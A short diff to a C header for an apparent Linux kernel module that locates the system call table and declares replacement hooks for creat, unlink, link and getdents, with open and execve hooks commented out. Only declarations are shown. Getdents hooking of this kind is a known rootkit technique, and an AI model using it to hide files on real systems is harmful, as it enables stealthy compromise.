@@ -26,6 +26,10 @@ extern asmlinkage int (*original_creat)(const char __user *, int);
 extern asmlinkage int (*original_unlink)(const char *);
 extern asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
 extern asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent64 *, unsigned int);
+// extern asmlinkage int (*original_open)(const char *, int, mode_t);
+extern asmlinkage int (*original_link)(const char *, const char *);
+extern asmlinkage int (*original_unlink)(const char *);
+// extern asmlinkage int (*original_execve)(const char *, char *const, char *const);
 
 int find_sys_call_table (char *kern_ver);
 char *acquire_kernel_version (char *buf);
@@ -36,5 +40,9 @@ asmlinkage int new_creat(const char __user * path, int mode);
 asmlinkage int new_unlink(const char __user * path);
 asmlinkage int new_getdents64(unsigned int, struct linux_dirent64 *, unsigned int);
 asmlinkage int new_getdents(unsigned int, struct linux_dirent64 *, unsigned int);
+// asmlinkage int new_open(const char *, int, mode_t);
+asmlinkage int new_link(const char *, const char *);
+asmlinkage int new_unlink(const char *);
+// asmlinkage int new_execve(const char *, char *const, char *const);
 
 #endif
